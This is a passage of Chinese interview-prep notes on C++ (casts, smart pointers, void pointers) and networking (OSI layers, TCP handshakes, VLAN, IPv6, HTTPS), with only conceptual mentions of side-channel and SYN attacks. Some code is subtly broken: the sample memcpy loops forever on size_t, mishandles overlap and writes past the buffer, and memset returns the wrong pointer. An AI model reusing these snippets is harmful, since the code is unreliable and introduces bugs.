  1
  0
  ```

  模板函数：是函数模板的实例化，是一个函数。
  `IsEqual<int>(7,7.0);`//显示生成

* 类模版

  模板类：是类模板的实例化，是一个类。

  ```c++
  #include<bits/stdc++.h>
  using namespace std;
  template<typename T>    //模板声明，其中T为类型参数
  class Compare{
  private:
  	T x,y; 
  public:
  	Compare(T i,T j){
  		x = i;
  		y = j;
  	}
  	T max(){
  		return (x>y)?x:y;
  	} 
  };
  int main(){
  	Compare<int>com1(3,7);                       //用类模板定义对象com1，此时T被int替代 
  	Compare<double>com2(12.34,56.78);            //用类模板定义对象com2，此时T被double替代 
  	Compare<char>com3('a','x');                  //用类模板定义对象com3，此时T被char替代 
  	cout<<com1.max()<<endl;
  	cout<<com2.max()<<endl;
  	cout<<com3.max()<<endl;
  	return 0;
  }
  
  ```

#### 30、C++读写文件有哪些函数？

`ifstream｜ofstream|fscanf|fread|fprintf|fwrite|fgetc|fputc|fgets|fputs`

```c++
#include <fstream>
#include <iostream>
using namespace std;
int main (){
    ifstream fr;
    ofstream fw;
    char word[200], line[200];
    fw.open("write.txt");
    fr.open("read.txt");
    fr  >> word;    //读取文件，一个单词
    fr.getline (line, 100);        //读取一行内容
    fw << "write file test" << endl;
    fw.close();
    fr.close();
    return 0;
}
```

#### 31、public，private，protect的区别

* public:可以被任意实体访问
* protected:只允许子类及本类的成员函数访问
* private:只允许本类的成员函数访问

```
public ＆ public继承 => public
public ＆ protected继承 => protected
public ＆ private继承 = > private

protected ＆ public继承 => protected
protected ＆ protected继承 => protected
protected ＆ private继承 = > private

private ＆ public继承 => 子类无权访问
private ＆ protected继承 => 子类无权访问
private ＆ private继承 = > 子类无权访问
```

这个表可以按照这个方式记忆

对private不管你怎么继承都是无法访问的，对于其他情况，我们有public > protected > private ,&之后取较小的那个权限，例如，`protected ＆ private继承 = > private`

#### 32、什么是左值？什么是右值？

* 能出现在赋值号左边的表达式称为“左值”，不能出现在赋值号左边的表达式称为“右值”。一般来说，左值是可以取地址的，右值则不可以。

* 非 const 的变量都是左值。函数调用的返回值若不是引用，则该函数调用就是右值。我们常提到的“引用”都是引用变量的，而变量是左值，因此它们都是“左值引用”

* c++11 新增了一种引用，可以引用右值，因而称为“右值引用”。无名的临时变量不能出现在赋值号左边，因而是右值。右值引用就可以引用无名的临时变量。定义右值引用的格式如下：

  `类型 && 引用名 = 右值表达式;`

  意义：

  * 消除两个对象交互时不必要的对象拷贝，节省运算存储资源，提高效率
  * 能够更简洁明确地定义泛型函数。



#### 33、C++有几种cast？用途是什么

* **static_cast**

  `用法：static_cast < type-id > ( expression )`
  该运算符把expression转换为type-id类型，但没有运行时类型检查来保证转换的安全性。

  * 用于类层次结构中基类和子类之间指针或引用的转换。进行上行转换（把子类的指针或引用转换成基类表示）是安全的；进行下行转换（把基类指针或引用转换成子类表示）时，由于没有**动态类型检查**，所以是不安全的。

  * 用于基本数据类型之间的转换，如把int转换成char，把int转换成enum。这种转换的安全性也要开发人员来保证。

  * 把空指针转换成目标类型的空指针。

    ```c++
    #include <bits/stdc++.h>
    using namespace std;
    int main(){
    	// char -> int
    	char a = 'a';
    	int b = static_cast<char>(a);
    	printf("%d\n",b );
    
    	//void * -> float *
    	float c = 2.14;
    	void *p = &c;
    	float *d = static_cast<float *>(p);
    	printf("%f\n",*d);
    
    	return 0;
    }
    
    97
    2.140000
    ```

    

  * 把任何类型的表达式转换成void类型。
    ⚠️static_cast不能转换掉expression的const、volitale、或者__unaligned属性。

* **dynamic_cast**

  `用法：dynamic_cast < type-id > ( expression )`

  * 在类层次间进行上行转换时，dynamic_cast和static_cast的效果是一样的,但在进行下行转换时，dynamic_cast具有**类型检查**的功能，比static_cast更安全。
  * type-id必须是类的指针、类的引用或者void *；
  * * dynamic_cast< type* >(e)
      type必须是一个“类”类型且必须是一个有效的指针
    * dynamic_cast< type& >(e)
      type必须是一个”类“类型且必须是一个左值
    * dynamic_cast< type&& >(e)
      type必须是一个”类“类型且必须是一个右值
  * dynamic_cast还可以用于类之间的交叉转换（cross cast）。

* **reinpreter_cast**

  `用法：reinpreter_cast<type-id> (expression)`

  * reinterpret_cast 用于进行各种不同类型的指针之间、不同类型的引用之间以及指针和能容纳指针的整数类型之间的转换。转换时，执行的是逐个比特复制的操作

    ```c++
    #include <bits/stdc++.h>
    using namespace std;
    int main() {
    	float a = 1.0;
    	cout<< hex << reinterpret_cast<int&>(a) << endl;
    
    	int b = 0x3f800000;
    	cout<< hex << reinterpret_cast<float&>(b) << endl;
    
    	int c = 10;
    	int *p = &c;	
    	cout<< hex << p << endl;
    	cout<< hex << reinterpret_cast<unsigned int &>(p) << endl;
    
    	return 0;	
    }
    
    
    3f800000
    1
    0x7ffeeddeab54
    eddeab54
    ```

    

* **const_cast**

  `用法：const_cast<type_id> (expression)`

  * 该运算符用来修改类型的const或volatile属性。除了const 或volatile修饰之外， type_id和expression的类型是一样的。

  * 常量指针被转化成非常量指针，并且仍然指向原来的对象；

  * 常量引用被转换成非常量引用，并且仍然指向原来的对象；

  * 常量对象被转换成非常量对象。

    ```c++
    #include <bits/stdc++.h>
    using namespace std;
    int main(){
    	const int a = 10;
    	int *p = const_cast<int*>(&a);
    	printf("%d\n",*p );
    
    	*p = 100;//未定义行为 不建议这么做
    	printf("%d\n",*p );
    	
    	printf("%d\n",a );
    	return 0;
    }
    
    10
    100
    10
    ```

    😄如果你想深入了解，为什么打印出来的a值还是10，请往下看

![image-20200229111452761](/Users/godspeed/Library/Application Support/typora-user-images/image-20200229111452761.png)

编译器对这个const 出现的地方做了常量替换



#### 34、 说说什么是智能指针？

> C++真让人头大，简历上一定不要写精通C++。

C++里面的四个智能指针: auto_ptr, shared_ptr, weak_ptr, unique_ptr 其中后三个是 c++11 支持，并且第一个已经被 11 弃用.

* 很大程度上可以避免内存泄漏的问题（除auto_ptr）

  * auto_ptr 有潜在的内存崩溃问题

    ```c++
    auto_ptr< string> p1 (new string ("Hello World!”));
    auto_ptr<string> p2;
    p2 = p1; //auto_ptr 不会报错.
    /*此时不会报错，p2 剥夺了 p1 的所有权，但是当程序运行时访问 p1 将会报错。所以 auto_ptr 的缺点是:存在潜在的内存崩溃问题!*/
    ```

    

  * unique_ptr 实现独占式拥有或严格拥有概念，保证同一时间内只有一个智能指针可以指向该对象。

    ```c++
    /*unique_ptr 有一个聪明的地方:当程序试图将一个 unique_ptr 赋值给另一个时，如果源 unique_ptr 是个临时右值，编译器允许这么做;如果源 unique_ptr 将存在一段时间，编译器将禁止这么做，*/
    
    unique_ptr<string> pu1(new string ("hello world")); 
    unique_ptr<string> pu2;
    pu2 = pu1; // #1 not allowed 
    unique_ptr<string> pu3;
    pu3 = unique_ptr<string>(new string ("You")); // #2 allowed
    ```

  * shared_ptr

    共享式拥有:多个智能指针可以指向相同对象，该对象和其相关资源会在“最后一个引用被销毁”时候释放。

    🤔类似操作系统中学到的共享文件

    可以通过成员函数 use_count()来查看资源的所有者个数。除了可以通过 new 来构造，还可以通过传入 auto_ptr, unique_ptr,weak_ptr 来构造。 当我们调用 release()时，当前指针会释放资源所有权，计数减一。当计数等于 0 时，资源会被 释放。

    shared_ptr 是为了解决 auto_ptr 在对象所有权上的局限性(auto_ptr 是独占的), 在使用引用计数的机制上提供了可以共享所有权的智能指针

    ```c++
    #include <bits/stdc++.h>
    using namespace std;
    class A{
    public:
        int i;
        A(int n):i(n){};
        ~A() { cout << i << " " << "destructed" << endl; }
    };
    int main() {
    		A *tmp = new A(100);
    		shared_ptr<A> sp1(tmp); //tmp由sp1托管
        shared_ptr<A> sp2(sp1); //sp1由sp2托管
        shared_ptr<A> sp3(sp2); //sp2由sp3托管
        cout<<"we have "<<sp1.use_count()<<endl;
    		
      	sp3.reset();
    		cout<<"we have "<<sp1.use_count()<<endl;
    		cout<<"we have "<<sp2.use_count()<<endl;
        return 0;	
    }
    
    
    we have 3
    we have 2
    we have 2
    100 destructed
    ```

    

  * weak_ptr

    * 设计目的:为配合 shared_ptr 而引入的一种智能指针来协助 shared_ptr 工作,
    * 用来解决 shared_ptr 相互引用时的死锁问题, 如果说两个 shared_ptr 相互引用,那么这两个指针的引用计数永远不可能下降为 0,资源永远不会释放。
    * 它是对对象的一种弱引用，不会增加对象的引用计数，和 shared_ptr 之间可以相互转化, shared_ptr 可以直接赋值给它，它可以通过调用 lock 函数来获得 shared_ptr

    ```c++
    #include <bits/stdc++.h>
    using namespace std;
    class B;//前向引用
    class A{
        public:
    		shared_ptr<B> _pb; 
    		~A(){
    			cout<<"A delete\n"; 
    		}
    };
    class B{
        public:
    		shared_ptr<A> _pa; //改成weak_ptr就会输出了
    		~B(){
    			cout<<"B delete\n"; 
    		}
    };
    int main() {
        shared_ptr <A> p1(new A());
        shared_ptr <B> p2(new B());
        p1->_pb = p2;
        p2->_pa = p1;
      //我们不能通过weak_ptr直接访问对象的方法，可以通过lock将其转化为shared_ptr
      //如p2->_pa.lock()->print();
    
        return 0;	
    }
    
    啥都不输出
    
    ```



#### 35、说说什么是野指针？

野指针就是指针指向的位置是不可知的（随机的、不正确的、没有明确限制的）指针变量在定义时如果未初始化，其值是随机的，指针变量的值是别的变量的地址，意味着指针指向了一个地址是不确定的变量，此时去解引用就是去访问了一个不确定的地址，所以结果是不可知的。

成因：

* 指针变量未初始化（要置NULL！）
* 指针释放后之后未置空（free/delete之后也要置NULL！）
* 指针操作超越变量作用域 (常见于保存在栈上的变量)



#### 36、什么是void指针

void 指针可以指向任意类型的数据，同时任何类型的指针都可以直接赋值给 void 指针，而无需进行其他相关的强制类型转换。下面两个库函数的代码请仔细阅读

```c
void *memset(void *buffer, int b, size_t size)
{
    assert(buffer!=NULL);
    char* retAddr = (char*)buffer;
    while (size--> 0)
    {
        *(retAddr++) = (char)b;
    }
    return retAddr;
}
```

```c
src -> dst
void *memcpy (void *dst,  const void *src,  size_t size)
{
    assert((dst!=NULL) && (src!=NULL));
    char *temp_dest = (char *)dst;
    char *temp_src = (char *)src;
    char* retAddr = temp_dest;
    size_t i = 0;
    /* 解决数据区重叠问题*/
    if ((retAddr>temp_src) && (retAddr<(temp_src+size))) /*若数据区重叠，从后往前赋值*/
    {
        for (i=size-1; i>=0; i--)
        {
            *(temp_dest++) = *(temp_src++);
        }
    }
    else
    {
        for (i=0; i<size; i++)
        {
            *(temp_dest++) = *(temp_src++);
        }
    }
    *(retAddr+size)='\0';
    return retAddr;
}
```



可见，这种通过定义void*的函数很好的解决了函数的通用性问题。int数组，char数组等等，都可以用这个函数来操作。

#### 37、C++引用的优点，为什么比指针安全？（腾讯20实习生面试）

C++的引用相当于变量的别名，使用之后不能被改变为另一个对象的引用，指针在定义时没有初始化就会变成野指针

#### 38、C++11新特性（腾讯20实习生面试）

* nullptr 空指针

* auto 类型自动推断

* for循环语法

  ```
  for (auto number : numbers){
      std::cout << number << std::endl;
  }
  ```

* `std::unordered_map` `std::array` 还有一堆

* 初始化列表`std::vector<int> v = { 1, 2, 3 };`

* 静态断言 `static_assert`

### 二、计算网络

参考王道课本

#### １、电子邮件协议

问法：简述POP3协议/发邮件的协议是什么

![image-20200303210109343](/Users/godspeed/Library/Application Support/typora-user-images/image-20200303210109343.png)

* SMTP (Simple Mail Transfer Protocol）
  * 从客户端发送邮件到本地邮件服务器，从本地邮件服务器到远方的邮件服务器。
  * 基于传输层的TCP协议，端口号25
  * 简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则,或者说是由它来控制信件传输的一种中转方式。SMTP 协议属于TCP/IP 协议族,它帮助每台计算机在发送或中转信件时找到下一个目的地
* POP3（Post Office Protocol 3）
  * 基于传输层的TCP协议，端口号110
  * 从客户端接受邮件服务器的邮件。 适用于 C/S 结构的脱机模型的电子邮件协议,目前已发展到第三版,称 POP3.,它规定怎样将个人计算机连接到 Internet 的邮件服务器和下载电子邮件的电子协议

#### 2、TCP/IP模型与OSI参考模型的比较

问法：知道OSI吗，有几层，从下到上讲一下，TCP/IP怎么分层的？这两个模型的相似之处？

* OSI七层口诀
  Please   Do   Not   Tell   Stupid   People   Anything
  Physical Data Layer Network Transportion Session Presentation Application

  * **应用层——Application(Layer 7)**

    * 功能：用户与网络的界面，为特定类型的网络应用提供访问OSI环境的手段。

    * 协议：HTTP，SMTP，DNS，FTP，WWW，Telnet

  * **表示层——Presentation(Layer 6) **

    * 功能：这一层的主要功能是定义<u>数据格式及加密</u>。例如，FTP允许你选择以二进制或ASCII格式传输。如果选择二进制，那么发送方和接收方不改变文件的内容。如果选择ASCII格式，发送方将把文本从发送方的字符集转换成标准的ASCII后发送数据。在接收方将标准的ASCII转换成接收方计算机的字符集。

    * 一般不问。协议：TIFF，GIF，JPEG

  * **会话层——Session(Layer 5)**

    * 功能：管理主机间的会话进程，包括建立、管理以及终止进程间的会话。会话层是用交验点可使通信绘画在通信失效时从校验点继续恢复通信，实现数据同步s

    * 一般不问。协议：RPC（远程过程调用），DAP（目录访问协议），SSL（安全套接字协议），TLS（传输层安全协议），LDAP（轻量级目录访问协议）

  * **传输层—— Transport(Layer 4)**

    * 传输单位：报文段（TCP）或用户数据报（UDP）
    * 功能：为端到端连接提供可靠的传输服务，为端到端连接提供流量控制、差错控制、服务质量、数据传输管理等服务。（端到端：不同主机内两个进程之间）

    * 协议：TCP、UDP

  * **网络层——Network(Layer 3)**

    * 传输单位：数据报
    * 功能：把网络层的协议数据单元（分组）从源端传到目的端，为分组交换网上的不同主机提供通信服务。对分组进行路由选择，实现流量控制、拥塞控制、差错控制和网际互联等。

    * 协议：IP、IPX、ICMP、IGMP、ARP、RARP、OSPF
    * 设备：路由器Router 路由器即隔离冲突域又隔离广播域

  * **数据链路层——Data Link(Layer 2)**

    * 传输单位：数据帧

    * 功能：成帧、差错控制、流量控制、传输管理。（点到点：主机到主机之间，点可以理解为一个MAC或IP地址）

    * 协议：SDLC、HDLC、PPP、STP和帧中继
    * 设备：交换机switch（多端口网桥）、网桥 隔离冲突域但是不隔离广播域

  * **物理层——Physical(Layer 1)**

    * 传输单位：比特
    * 功能：在物理媒体上为数据端设备<u>传输原始比特流</u>。

    * 协议：EIA-232C、EIA/TIA RS-449、CCITT的X.21

    * 设备：

      * 集线器hub（多接口中继器）

        任何时刻都只能有一个结点通过公共信道发送数据。 

      * 中继器repeater（信号再生）

      * 不隔离广播域和冲突域

* ![image-20200303212904914](/Users/godspeed/Library/Application Support/typora-user-images/image-20200303212904914.png)

* ![image-20200303213425058](/Users/godspeed/Library/Application Support/typora-user-images/image-20200303213425058.png)

* OSI模型中，低三层为<u>通信子网</u>，高三层为<u>资源子网</u>

* ARP在OSI的哪一层？——网络层（滴滴面试）

#### ３、说一个网络加密算法并解释一下

* DES 

  * 对称加密算法
  * 数据加密标准（DES）是美国的一种由来已久的加密标准，它使用对称密钥加密法。DES使用56位密钥和密码块的方法，而在密码块的方法中，文本被分成64位大小的文本块然后再进行加密。

  * 属于Feistel架构：用于分组密码中的一种对称结构

* 3DES（Triple DES）

  * 对称加密算法

  * 3DES（即Triple DES）是DES向AES过渡的加密算法，比起最初的DES，3DES更为安全。
  * 其具体实现如下：设Ek()和Dk()代表DES算法的加密和解密过程，K代表DES算法使用的密钥，M代表明文，C代表密文，这样：
    * 3DES加密过程为：C=Ek3(Dk2(Ek1(M))) 加-解-加
    * 3DES解密过程为：M=Dk1(EK2(Dk3(C))) 解-加-解

* RSA

  * 非对称加密算法

  * RSA 的安全性依赖于大数分解。（超级计算机能否干翻RSA，拭目以待）
  * 公钥和私钥都是两个大素数（  大于  100个十进制位）的函数。
  * 加密过程：
    * 产生密钥对：选择两个大素数，p和q  。计算：  `n = p * q`	
    * 随机选择加密密钥 e，要求  e  和  ( p - 1 ) * ( q - 1 )  互质。
    * 利用欧几里得算法计算解密密钥d,
    * 满足`e * d = 1 ( mod ( p - 1 ) * ( q - 1 ) )`	其中n 和d 也要互质。
    * 数 e 和 n 是公钥，d 是私钥。两个素数 p 和 q 不再需要，应该丢弃，不要让任何人知道。  
    * 加密信息  m（二进制表示）时，首先把 m 分成等长数据块  m1 ,m2,..., mi ，块长 s，其中 2^s <= n, s  尽可能的大。
    * 对应的密文是： ci = mi^e ( mod n )

  * 解密过程
    * mi = ci^d ( mod n ) 

#### 4、什么是侧信道攻击（旁路攻击）？

* side channel attack 

* 针对加密电子设备在运行过程中的时间消耗、功率消耗或电磁辐射之类的侧信道信息泄露而对加密设备进行攻击的方法被称为边信道攻击。这类新型攻击的有效性远高于密码分析的数学方法，因此给密码设备带来了严重的威胁。

* 已实现的

  * 通过CPU缓存来监视用户在浏览器中进行的快捷键及鼠标操作

  对最新型号的英特尔CPU有效，如Core i7；还需运行在支持HTML5的浏览器上。带有恶意JS的网页在受害者电脑上执行后，会收集与之并行的其它进程的信息，有了这个信息，攻击者可以绘制内存对按下按键和鼠标移动的反应情况，进而重塑用户使用情景。

  * 听译”电子邮件密钥

  通过智能手机从运行PGP程序的计算机中“听译”密钥。这项最新的密钥提取攻击技术，能够准确地捕捉计算机CPU解码加密信息时的高频声音，并提取密钥。



#### ５、100base-T 是什么

100Base-T是一种以100Mbps速率工作的局域网（LAN）标准，它通常被称为快速以太网标准，并使用两对UTP（非屏蔽双绞线）铜质电缆

Base  表示基带传送，传送数字信号，与宽带传送相对应， T 表示介质是双绞线(Twisted)

![image-20200306213437956](/Users/godspeed/Library/Application Support/typora-user-images/image-20200306213437956.png)

#### 6、什么是网格计算

网格计算是分布式计算的一种，是一门计算机科学。它研究如何把一个需要非常巨大的计算能力才能解决的问题分成许多小的部分，然后把这些部分分配给许多计算机进行处理，最后把这些计算结果综合起来得到最终结果。 最近的分布式计算项目已经被用于使用世界各地成千上万志愿者的计算机的闲置计算能力，通过因特网，您可以分析来自外太空的电讯号，寻找隐蔽的黑洞，并探索可能存在的外星智慧生命；您可以寻找超过1000万位数字的梅森质数；您也可以寻找并发现对抗艾滋病毒更为有效的药物。用以完成需要惊人的计算量的庞大项目

#### 7、分层有什么好处

* 每一层可实现一种相对独立的功能
* 将一个难以处理的复杂问题分解为若干较容易处理的较小的问题
* 有利于移植

#### 8、局域网和广域网的架构有什么区别

* 广域网WAN
  * 广域网的任务是提供长距离通信，运送主机所发送的数据，其覆盖范围通常为几十到几千千米的区域，因而有时也称为远程网。广域网是因特网的核心部分。连接广域网的各<u>结点交换机</u>的链路一般都是高速链路，具有较大的通信容量。

* 局域网 LAN
  * 局域网一般用微机或工作站通过高速线路（比如路由器）相连，覆盖范围较小， 一般是 指几十米到几千米的区域。局域网在计算机配置的数量上没有太多的限制，少的可以只有两台， 多的可达几百台。传统上，局域网使用广播技术，而广域网则使用交换技术 

#### 9、tcp 与 udp 的区别

* tcp 

  * 传输控制协议（ Transmission Control Protocol,  TCP）
  * 面向连接的，数据传输的单位是报文段，能够提供可靠的交付 。

  *  TCP 数据开销比 UDP 大，它能保证数据准确到达，传送网页，邮件之类的用 TCP
  * 支持单播，全双工通信，支持字节流传送，可靠地服务，提供流量控制和拥塞控制

* udp 

  * 用户数据报协议（ User Datagram Protocol,  UDP ）  
  * 无连接的，数据传输的单位是用户数 据报，不保证提供可靠的交付，只能提供“尽最大努力交付”。

  * UDP 一般用于局域网传数，传视频数据等
  * 不可靠 (Unreliable)、无连接 (Connectionless)、不保证按顺序接收、不提供流量控制 、不提供拥塞控制

扩展问题：

* **UDP和TCP哪个能进行伪造**

  TCP可以进行伪造的。

* **如何实现udp的可靠传输**

  UDP工作在传输层，无法保证数据可靠传输，只能在<u>应用层</u>实现了，方式参照tcp可靠性传输的方式。

  * 添加seq/ack机制，确保数据发送到对端
  * 添加发送和接收缓冲区，用户超时重传。
  * 添加超时重传机制。

  如下开源程序利用udp实现了可靠的数据传输。分别为`RUDP、RTP、UDT`

  * RUDP（Reliable User Datagram Protocol）
  提供改进的拥塞控制、重发机制等，可靠UDP的拥塞控制机制允许TCP方式下的流控制行为。
  * RTP（Real Time Protocol）
  为数据提供具有实时特征的端对端传送服务
  * UDT（UDP-based Data Transfer Protocol）
  支持高速广域网上的海量数据传输，TCP在高带宽长距离网络上性能很差。

* **SYN攻击讲一下**

  syn其实就是在第二次握手结束后，由于TCP3次握手机制，服务器得等着用户那一端给它反馈，所以服务器得分配一定的资源等着用户。可是，用户如果比较坏，不但不回服务器，反倒搞一大堆第一次握手的syn请求消息，这下服务器可惨了，又得腾出资源给用户留着，最后可能宕机。

* **TCP三次握手的原理讲一下，为什么不能两次？**

  ![image-20200328224533617](/Users/godspeed/Library/Application Support/typora-user-images/image-20200328224533617.png)

  谢希仁版《计算机网络》里说，“三次是保证双方互相明确对方能收能发的最低值”。

  1：A发，B收， B知道A能发
  2：B发，A收， A知道B能发收
  3：A发，B收， B知道A能收

  

* **四次挥手的原理讲一下**

  ![image-20200328233726267](/Users/godspeed/Library/Application Support/typora-user-images/image-20200328233726267.png)



第一步：客户机打算关闭连接，就向其 TCP 发送一个连接释放报文段，并停止再发送数据， 主动关闭 TCP 连接，该报丈段的 FIN 标志位被置 1, seq=u，它等于前面己传送过的数据的最后 一个字节的序号加 1 (FIN报文段即使不携带数据，也要消耗掉一个序号） 。 TCP 是全双工的，即可以想象成是一条 TCP 连接上有两条数据通路。当发送 FIN 报文时，发送 FIN 的一端就不能再 发送数据，也就是关闭了其中一条数据通路，但对方还可以发送数据。

第二步：服务器收到连接释放报文段后即发出确认，确认号是 ack=u+1，而这个报文段自己 的序号是 v，等于它前面己传送过的数据的最后一个字节的序号加 1。此时，从客户机到服务器 这个方向的连接就释放了， TCP 连接处于半关闭状态。但服务器若发送数据，客户机仍要接收，即从服务器到客户机这个方向的连接并未关闭。

第三步：若服务器已经没有要向客户机发迭的数据，就通知 TCP 释放连接，此时其发出 FIN=1 的连接释放报文段 。

第四步：客户机收到连接释放报文段后，必须发出确认 。 在确认报文段中， ACK 字段被置 为 1，确认号ack=w+1 ， 序号 seq=u + 1。此时 TCP 连接还没有释放掉，必须经过时间等待计时器 设置的时间 2MSL 后， A才进入到连接关闭状态。

<u>相关问题：</u>

* 为什么连接的时候是三次握手，关闭的时候却是四次握手？

答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，"你发的FIN报文我收到了"。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。

* 为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？

答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假想网络是不可靠的，有可能最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。在Client发送出最后的ACK回复，但该ACK可能丢失。Server如果没有收到ACK，将不断重复发送FIN片段。所以Client不能立即关闭，它必须确认Server接收到了该ACK。Client会在发送出ACK之后进入到TIME_WAIT状态。Client会设置一个计时器，等待2MSL的时间。如果在该时间内再次收到FIN，那么Client会重发ACK并再次等待2MSL。所谓的2MSL是两倍的MSL(Maximum Segment Lifetime)。MSL指一个片段在网络中最大的存活时间，2MSL就是一个发送和一个回复所需的最大时间。如果直到2MSL，Client都没有再次收到FIN，那么Client推断ACK已经被成功接收，则结束TCP连接。

#### 10、RSA 和 DES 在网络数据加密中的应用

RSA 主要在密钥分发，DES 主要在加密传输

#### 11、Internet 的服务和协议

TCP/IP 协议：作用是使计算机之间进行无障碍的通信，让其有相通的语言， 即统一的通信协议。

TCP 协议：作用是在发送与接收计算机系统之间维持连接，同时还要提供无差错的通信服务，将发送的数据报文还原并组装起来，自动根据计算机系统间的距离远近修改通信确认的超时值．

IP 协议：作用是控制网络上的数据传输。

#### 12、VLAN 是什么,怎么实现

虚拟局域网 （Virtual LAN,  VLAN)

* 利用以太网交换机可以很方便地实现。
* 不仅可以隔离冲突域，也可以隔离广播域 。
* 虚拟局域网 VLAN  是一组逻辑上的设备和用户，这些设备和用户并不受物理网段的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。
* VLAN  工作在 OSI 参考模型的第 2 层和第 3 层，一个 VLAN 就是一个广播域， VLAN 之间的通信是通过第 3 层的路由器来完成的。与传统的局域网技术相比较， VLAN 技术更加灵活，它具有以下优点：
  * 网络设备的移动、添加和修改的管理开销减少
  * 可以控制广播活动
  * 可提高网络的安全性

* 从技术角度讲，VLAN 的划分可依据不同原则，一般有以下三种划分方法： 

  * 基于端口的 VLAN 划分

    这种划分是把一个或多个交换机上的几个端口划分一个逻辑组，这是最简单、最有 效的划分方法。该方法只需网络管理员对网络设备的交换端口进行重新分配即可，不用考 虑该端口所连接的设备。

  * 基于 MAC 地址的 VLAN 划分

    MAC 地址其实就是指网卡的标识符，每一块网卡的 MAC 地址都是惟一且固化在网卡 上的。MAC 地址由 12 位 16 进制数表示，前 6 位为网卡的厂商标识（OUI），后 6 位为网卡标 识（NIC）。网络管理员可按 MAC 地址把一些站点划分为一个逻辑子网。

  * 基于路由的 VLAN 划分

    路由协议工作在网络层，相应的工作设备有路由器和路由交换机（即三层交换机）。该方式允许一个 VLAN 跨越多个交换机，或一个端口位于多个 VLAN 中。

#### 13、网络操作系统和分布式系统的区别

* 网络操作系统	
  * 建立在单机操作系统之上的一个开放式的软件系统
  * 面对各种不同的计算机系统的互连
  * 面对不同单机操作系统之间的资源共享、用户操作协调和与单机操作系统的交互
  * 解决多个网络用户互连的问题

* 分布式操作系统	
  * 大量的计算机通过网络被连接在一起，可以获得极高的运算能力及广泛的数据共享。
  * 特征
    * 统一性，即它是一个统一的操作系统。 
    * 共享性，即所有的分布式系统中的资源是共享的
    * 透明性，其含义是用户并不知道分布式系统是运行在多台计算机上，在用户眼里整个分布式系统中的许多计算机就像是一台计算机，对用户来讲是透明的
    * 独立性，即处于分布式系统的多个主机都处于平等地位，在物理上独立。

* 区别

  * 网络操作系统可以构架于不同的操作系统之上，也就是说它可以在不同的本机操作系统上，通过网络协议实现网络资源的统一配置，在大范围内构成网络操作系统。在网络操作系统中并不要求对网络资源进行透明的访问，即需要指明资源位置与类型，对本地资源和异地资源访问区别对待。

  * 分布式比较强调单一性，它是由一种操作系统构架的。在这种操作系统中， 网络的概念在应用层被淡化了。所有资源（本地的资源和异地的资源）都用同一方式管理与访问，用户不必关心资源在哪里，或者资源是怎样存储的

#### 14、ipv4 ipv6区别

* IPV6号称可以为全世界的每一粒沙子编上一个地址

* 与 IPV4 相比，IPV6 具有以下几个优势：
  * IPv6 具有更大的地址空间。IPv4 中规定IP 地址长度为 32，即有 2^32个地址；而 IPv6 中 IP 地址的长度为 128，即有 2^128 个地址。
  * IPv6 使用更小的路由表。IPv6 的地址分配一开始就遵循聚类（Aggregation）的原则，这使得路由器能在路由表中用一条记录（Entry）表示一片子网，大大减小了路由器中路由表的长度，提高了路由器转发数据包的速度。
  * IPv6 增加了增强的组播（Multicast）支持以及对流的支持（Flow Control），这使 得网络上的多媒体应用有了长足发展的机会，为服务质量（QoS，Quality of Service）控制 提供了良好的网络平台。
  * IPv6 加入了对自动配置（Auto Configuration）的支持。这是对DHCP协议的改进 和扩展，使得网络（尤其是局域网）的管理更加方便和快捷。
  * IPv6具有更高的安全性。在使用  IPv6网络中用户可以对网络层的数据进行加密并对 IP 报文进行校验，极大的增强了网络的安全性。
  
* 前景：虽然IPv6在全球范围内还仅仅处于研究阶段，许多技术问题还有待于进一步解决，并且支持IPv6的设备也非常有限。

* 扩展：
  * 我们知道IPv4是有分片机制的，IPv6没有完全放弃分片机制，只是说它用一种完全不同的机制来实现分片：
    * 分片和重组只能在端主机进行。
    * 分片信息不在IPv6协议标准头里，而单独设计一个扩展头存放
  
* IPV6地址表示

  0位压缩：FF01:0:0:0:0:0:0:1101 → FF01::1101

  冒分十六进制表示法（可省略前导0）：2001:0DB8:0000:0023:0008:0800:200C:417A→ 2001:DB8:0:23:8:800:200C:417A

  

#### 15、 HTTPS 协议怎么实现的/HTTPS的工作原理或建立过程/讲一下用到的CA证书

* 概念：简单讲是 HTTP 的安全版。

  HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS 在HTTP 的基础下加入SSL 层，HTTPS 的安全基础是 SSL，因此加密的详细内容就需要 SSL。 HTTPS 存在不同于 HTTP 的默认端口及一个加密/身份验证层（在 HTTP与 TCP 之间）。这个系统提供了身份验证与加密通讯方法。

  ![image-20200331161319749](/Users/godspeed/Library/Application Support/typora-user-images/image-20200331161319749.png)

* 应用：安全敏感的通讯，如交易支付。

* 端口：443

* 主要作用：

  * 建立一个信息安全通道，来保证数据传输的安全
  * 确认网站的真实性。

* 服务器认证：

  这个过程需要认证授权机构（Certificate Authority，CA）对服务端做认证。

  ①服务器发送公钥（S.pub）给CA

  ②CA用自己的私钥对服务器的公钥签名得到Sign 

  ③CA把签名（Sign）发给服务器

* 工作原理：<u>将对称加密，非对称加密两者结合起来</u>

  ①客户端发起HTTPS请求(你好，服务器)

  用户在浏览器里输入一个https网址，然后连接到server的443端口。

  ②服务端的配置

  采用HTTPS协议的服务器手中有一对公钥S.pub和私钥S.pri。

  ③传送证书（客户端，这是我的证书）

  服务器把证书发给客户端。证书中包含了很多信息（只罗列了几个重要的）

  * 证书的发布机构CA
  * 证书的有效期（Expired Date）
  * 公钥（S.pub）
  * 证书所有者
  * 签名（Sign）
  
  ④客户端解析证书（服务端，我来查查你的证书）
  
  * 首先浏览器读取证书中的证书所有者、有效期等信息进行校验
